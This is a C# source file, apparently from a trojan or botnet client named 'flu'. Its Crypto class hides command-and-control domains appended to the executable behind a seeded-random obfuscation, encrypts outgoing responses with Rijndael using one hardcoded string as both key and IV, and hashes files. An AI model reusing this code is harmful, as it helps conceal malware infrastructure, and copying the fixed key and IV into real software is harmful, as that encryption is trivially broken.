using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Xml;
using System.Security.Cryptography;
using System.IO;

namespace flu
{
    /// <summary>
    /// La clase Crypto engloba las funciones de cifrado y descifrado de información
    /// </summary>
    class Crypto
    {
        /// <summary>
        /// Cifra una cadena de texto y la devuelve codificada en Base 64. Se utiliza para enviar las respuestas cifradas.
        /// </summary>
        /// <param name="text">Devuelve un string con un texto cifrado y codificado en Base 64</param>
        /// <returns></returns>
        public static string EncryptRijndael(string text)
        {
            byte[] key = Encoding.ASCII.GetBytes("qwertyuioplkjhgf");
            byte[] iv = Encoding.ASCII.GetBytes("qwertyuioplkjhgf");
            byte[] textBytes = Encoding.ASCII.GetBytes(text);
            byte[] result;
            RijndaelManaged cripto = new RijndaelManaged();
            using (MemoryStream ms = new MemoryStream(textBytes.Length))
            {
                using (CryptoStream objCryptoStream = new CryptoStream(ms, cripto.CreateEncryptor(key, iv), CryptoStreamMode.Write))
                {
                    objCryptoStream.Write(textBytes, 0, textBytes.Length);
                    objCryptoStream.FlushFinalBlock();
                    objCryptoStream.Close();
                }
                result = ms.ToArray();
            }
            return Convert.ToBase64String(result);
        }

        /// <summary>
        /// Descifra los dominios almacenados al final del EXE
        /// </summary>
        /// <param name="text">Texto cifrado con los dominios</param>
        /// <returns>Dominios descifrados</returns>
        public static string DecryptDomains(string text)
        {
            string output = string.Empty;
            Random keyGen = new Random(int.MaxValue - (int)(int.MaxValue * 0.2333));

            string[] chars = text.Split('~');

            foreach (string c in chars)
            {
                int cByteVal = (int.Parse(c) / keyGen.Next(10000));
                output += Convert.ToChar(cByteVal).ToString();
            }
            return output;
        }

        /// <summary>
        /// Calcula el hash de un archivo
        /// </summary>
        /// <param name="file">Archivo</param>
        /// <param name="algorithme">Algoritmo de hashing</param>
        /// <returns>Firma del archivo</returns>
        public static string getSignature(string filename, string algorithm)
        {
            HashAlgorithm hashAlgorithm  = HashAlgorithm.Create(algorithm);
            FileStream fs = System.IO.File.OpenRead(filename);
            Byte[] Data = hashAlgorithm.ComputeHash(fs);     
            fs.Close ();
            return BitConverter.ToString(Data).Replace("-", "");
        }
    }
}
